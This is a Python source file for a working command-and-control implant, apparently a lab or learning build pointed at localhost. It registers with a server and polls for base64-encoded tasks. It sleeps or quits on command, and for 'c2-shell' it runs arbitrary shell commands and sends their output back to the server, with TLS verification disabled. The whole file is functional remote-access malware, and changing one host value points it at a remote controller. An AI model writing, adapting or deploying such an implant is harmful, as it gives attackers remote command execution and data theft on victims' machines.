import requests
import time
import subprocess
import base64

is_base64_enabled = True

host = "https://127.0.0.1:5000"
name = ""
delay = 15

def register():    
    # Send a POST request to localhost/register and display the response
    url = f"{host}/register"
    data = {"type": "linux"}
    response = requests.post(url, data=data, verify=False)
    print(f"Server response: {response.text}")
    return response.text

def read_run_task():    
    if name:
        url = f"{host}/tasks/{name}"
    else:
        url = f"{host}/tasks/dummyuuid"
    response = requests.get(url, verify=False)
    decoded_data = response.text
    print(f"Server sent command to execute before: {decoded_data}")
    if is_base64_enabled:
        decoded_data = base64.b64decode(response.text).decode("utf-8")    
    print(f"Server sent command to execute after: {decoded_data}")
    return decoded_data

def post_results(output):    
    print(f'output: {output}')    
    url = f"{host}/results/{name}"    
    encoded_data = output
    if is_base64_enabled:
        encoded_data = base64.b64encode(output.encode("utf-8"))
    data = {"result": encoded_data}
    response = requests.post(url, data=data, verify=False)
    print(f"Server response: {response.text}")

# import urllib3
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
# This while is needed in case the server is down and we reach max retries
while True:
    try:
                
        name = register()
        delay = 15
        
        while True:      
            
            time.sleep(delay)

            rsp = read_run_task()            

            if not rsp:
                continue

            cmd = rsp.split()

            if cmd[0] == "c2-quit": 
                print("c2-quit... exiting...")               
                exit(1)

            elif cmd[0] == "c2-sleep": 
                delay = int(cmd[1])
                print(f"c2-sleep set to {delay}")  
                post_results(f"sleep set to {delay}")                             
                
            elif cmd[0] == "c2-register":
                name = register()                
                
            elif cmd[0] == "c2-shell":
                command = ' '.join(cmd[1:])
                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)                
                #result.wait()
                output = result.stdout.decode("utf-8")                
                post_results(output)           
            
            
    except Exception as ex:
        print(f"Failed ex : {ex}")
        